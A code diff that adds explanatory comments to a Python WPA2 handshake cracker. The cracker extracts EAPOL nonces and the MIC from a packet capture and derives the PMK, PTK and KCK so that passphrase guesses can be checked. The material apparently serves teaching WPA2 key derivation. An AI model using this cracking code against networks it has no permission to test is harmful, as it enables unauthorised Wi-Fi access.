@@ -15,8 +15,8 @@ class WPA2Cracker:
     3. Verifying passwords by comparing computed vs captured MIC values
     """
 
-    def __init__(self, pcap_file, ssid):
-        self.pcap_file = pcap_file
+    def __init__(self, capture_file, ssid):
+        self.capture_file = capture_file
         self.ssid = ssid
         self.handshake_data = None
 
@@ -26,10 +26,14 @@ class WPA2Cracker:
 
         Correctly identifies ANonce and SNonce from monitor-mode captures.
         """
-        packets = scapy.rdpcap(self.pcap_file)
+        packets = scapy.rdpcap(self.capture_file)
         eapol_packets = [
             p for p in packets if p.haslayer(scapy.EAPOL) and p.haslayer(scapy.Dot11)
         ]
+        """
+        p.haslayer(scapy.EAPOL) -> Whether the packet contains an EAPOL layer
+        p.haslayer(scapy.Dot11) -> The packet is a Wi-Fi (802.11) frame
+        """
 
         if len(eapol_packets) < 2:
             print("❌ Insufficient EAPOL packets for handshake")
@@ -42,18 +46,46 @@ class WPA2Cracker:
             eapol_raw = bytes(pkt[scapy.EAPOL])
             if len(eapol_raw) < 97:
                 continue
+            """
+            pkt[scapy.EAPOL] accesses the EAPOL part 
+            bytes(...) converts that part into a raw byte sequence
+            the EAPOL frame is at least 97 bytes long
+            MIC field is located at 81-96 (16 bytes long)
+            """
 
             key_info = struct.unpack(">H", eapol_raw[5:7])[0]
+            """
+            ">H" -> convert to integer
+            Key Information (1/2/3/4)
+            """
             key_nonce = eapol_raw[17:49]
             key_mic = eapol_raw[81:97]
 
             ack = bool(key_info & 0x0080)
+            """
+            bit 7 -> Key ACK (AP is acknowledging the key exchange.)
+            """
             mic_flag = bool(key_info & 0x0100)
+            """
+            bit 8 -> MIC is present in this message.
+            """
             pairwise = bool(key_info & 0x0008)
+            """ 
+            bit 3 -> A pairwise (client-specific) key, not a group key.
+            """
 
             dot11 = pkt[scapy.Dot11]
+            """
+            extracts the 802.11 (Wi-Fi) layer
+            addr1: Dest MAC (Receiver)
+            addr2: Src MAC (Transmitter)
+            addr3: BSSID (the AP)
+            """
 
             def mac_clean(mac): return mac.replace(":", "").lower() if mac else None
+            """ 
+            removing colons (:) and convert lowercase
+            """
 
             if pairwise and ack and not mic_flag and not anonce:
                 # Message 1 (ANonce): AP → STA
@@ -66,6 +98,11 @@ class WPA2Cracker:
                 snonce = key_nonce
                 mic = key_mic
                 mic_data = eapol_raw[:81] + b"\x00" * 16 + eapol_raw[97:]
+                """
+                When verifying or computing the MIC, we must zero out the existing MIC field.
+                The MIC is calculated over the entire EAPOL frame.
+                But we cannot include the MIC itself in the calculation (circular dependency).
+                """
 
         if not all([anonce, snonce, ap_mac, client_mac, mic, mic_data]):
             print("❌ Failed to extract full handshake")
@@ -95,6 +132,12 @@ class WPA2Cracker:
         """
         # Step 1: Derive Pre-Shared Master Key using PBKDF2
         pmk = PBKDF2(passphrase, self.ssid.encode("utf-8"), 4096).read(32)
+        """
+        Uses the PBKDF2 algorithm
+        self.ssid.encode("utf-8") -> (PBKDF2 requires bytes).
+        4096 -> Number of hash iterations
+        Reads the first 32 bytes (256 bits) of the derived key.
+        """
 
         # Step 2: Sort MAC addresses and nonces (lexicographically)
         mac1, mac2 = bytes.fromhex(self.handshake_data["ap_mac"]), bytes.fromhex(
@@ -107,10 +150,24 @@ class WPA2Cracker:
 
         # Step 3: Generate PTK using Pseudo-Random Function
         ptk = self._prf(pmk, b"Pairwise key expansion\x00", mac_data + nonce_data, 64)
+        """
+        b"Pairwise key expansion\x00":
+        A constant string (label) used in PTK derivation. \x00 (null byte), as required by WPA2 spec.
+        WPA2 uses a 512-bit PTK (64 bytes) composed of:
+        16 bytes for KCK (Key Confirmation Key)
+        16 bytes for KEK (Key Encryption Key)
+        16 bytes for TK (Temporal Key)
+        16 bytes for Michael MIC Key (not used in WPA2)
+        """
         return ptk[:16]  # Return KCK (Key Confirmation Key)
 
     def _prf(self, key, prefix, data, length):
         """Pseudo-Random Function implementation using HMAC-SHA1"""
+        """
+        This function implements a pseudo-random function (PRF) using HMAC-SHA1, 
+        which is required by the WPA2 specification to expand the PMK (32 bytes) 
+        into the PTK (64 bytes).
+        """
         result, counter = b"", 0
         while len(result) < length:
             result += hmac.new(
